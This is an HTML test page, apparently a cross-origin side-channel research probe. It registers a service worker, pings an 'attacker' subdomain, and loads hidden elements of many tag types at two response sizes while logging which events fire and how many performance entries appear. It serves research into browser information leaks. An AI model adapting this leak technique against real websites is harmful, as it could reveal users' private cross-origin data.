<!DOCTYPE html>
<html>
  <head>
    <title>Response size leak</title>
    <script>

      function show(element, url, size, event, diff) {
        document.getElementById('tbody').innerHTML += `<tr><td>${element}</td><td>${url}</td><td>${size}</td><td>${event}</td><td>${diff}</td><tr>`;
      }

      var events = [
        'onload', 'onerror', 'onabort', 'onemptied', 'onstalled', 'onsuspend',
      ]
      var id = 0;

      function get(tag, attribute, location, url, size) {
        let start = performance.getEntries().length;
        let element = document.createElement(tag);
        element[attribute] = `${url}?id=${id < 10 ? '0' + id : id}&size=${size}&tag=${tag}`;
        id++;
        if (location != '') {
          element.hidden = true;
          document[location].appendChild(element);
        }

        for (const event of events) {
          element[event] = () => {
            show(tag, url, size, event, performance.getEntries().length - start);
          }
        }
      }

      var base = 'https://georgetian.com';

      var sizes = [
        10,
        1000,
      ];

      var tags = [
        ['applet', 'code', 'body'],
        ['audio', 'src', 'body'],
        ['embed', 'src', 'body'],
        ['frame', 'src', 'body'],
        ['iframe', 'src', 'body'],
        ['img', 'src', 'body'],
        ['input', 'src', 'body'],
        ['link', 'href', 'body'],
        ['object', 'data', 'body'],
        ['script', 'src', 'body'],
        ['track', 'src', 'body'],
        ['video', 'poster', 'body'],
        ['video', 'src', 'body'],
      ]

      var delay = 100;

      function run() {
        
        fetch('/reset');

        for (var i = 0; i < tags.length; i++) {
          for (const size of sizes) {
            setTimeout(get, (i + 1) * delay, tags[i][0], tags[i][1], tags[i][2], base, size);
          }
        }

      }

      if ('serviceWorker' in navigator) {
        addEventListener('load', async () => {
          await navigator.serviceWorker.register('serviceworker.js');
          await fetch('https://attacker.georgetian.com/reset');
          setTimeout(run, 1000);
        });
			} else {
        document.body.innerHTML += ('Browser does not support Service Workers');
      }

    </script>

    <style>
      table, th, td {
        border: 1px solid black;
        border-collapse: collapse;
      }
    </style>

  </head>

  <body>
    <table>
      <thead>
        <tr>
          <th>Element</th>
          <th>URL</th>
          <th>Size</th>
          <th>Event</th>
          <th>Entries</th>
        </tr>
      </thead>
      <tbody id="tbody">

      </tbody>
    </table>
  </body>

</html>